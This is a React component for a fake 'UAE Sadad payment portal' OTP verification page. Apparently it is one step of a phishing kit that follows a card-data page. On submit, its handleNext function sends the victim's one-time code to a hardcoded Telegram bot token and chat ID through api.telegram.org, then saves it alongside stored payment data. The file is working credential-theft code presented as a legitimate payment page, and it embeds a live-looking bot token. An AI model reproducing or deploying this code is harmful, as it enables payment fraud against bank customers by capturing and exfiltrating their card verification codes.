import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function VerifyOtp() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(300);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
🔐 *رمز التحقق (OTP) - بوابة سداد الإمارات*
--------------------------
🔢 *الرمز المدخل:* ${otp}
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
      sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, otp }));
      setLocation("/confirm-payment");
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex flex-col items-center">
          <div className="bg-amber-500 p-2 rounded-full mb-1">
            <span className="text-white font-bold text-lg">سداد</span>
          </div>
          <h1 className="text-xl font-bold text-gray-800">بوابة سداد الإمارات</h1>
        </div>
      </header>

      <main className="flex-grow container py-8 px-4">
        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-lg p-6 border border-gray-100">
          <div className="flex justify-between mb-8 relative">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className={`z-10 w-8 h-8 rounded-full flex items-center justify-center font-bold ${step <= 4 ? 'bg-amber-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                {step}
              </div>
            ))}
            <div className="absolute top-4 left-0 right-0 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-green-50 p-6 rounded-xl border border-green-100 text-center mb-8">
            <div className="text-green-600 text-3xl mb-2">✓</div>
            <h3 className="font-bold text-green-900 mb-1">تم إرسال رمز التحقق</h3>
            <p className="text-sm text-green-700">تم إرسال رمز التحقق إلى رقم جوالك المسجل</p>
          </div>

          <form onSubmit={handleNext} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="otp" className="text-lg font-bold block text-center">أدخل رمز التحقق (6 أرقام)</Label>
              <Input id="otp" required placeholder="000000" className="text-center text-2xl tracking-widest py-6" value={otp} onChange={(e) => setOtp(e.target.value)} />
            </div>

            <div className="bg-amber-50 p-4 rounded-lg text-center border border-amber-100">
              <p className="text-sm text-amber-800 mb-1">صلاحية الرمز تنتهي في:</p>
              <p className="text-2xl font-bold text-amber-600">{formatTime(timer)}</p>
            </div>

            <p className="text-xs text-center text-gray-400">يمكنك إعادة إرسال الرمز بعد انتهاء الوقت</p>

            <div className="flex gap-4 pt-4">
              <Button type="button" variant="outline" className="flex-1" onClick={() => setLocation("/card-data")}>الرجوع</Button>
              <Button type="submit" className="flex-1 bg-amber-500 hover:bg-amber-600 text-white" disabled={loading}>
                {loading ? "جاري المعالجة..." : "التالي"}
              </Button>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
}
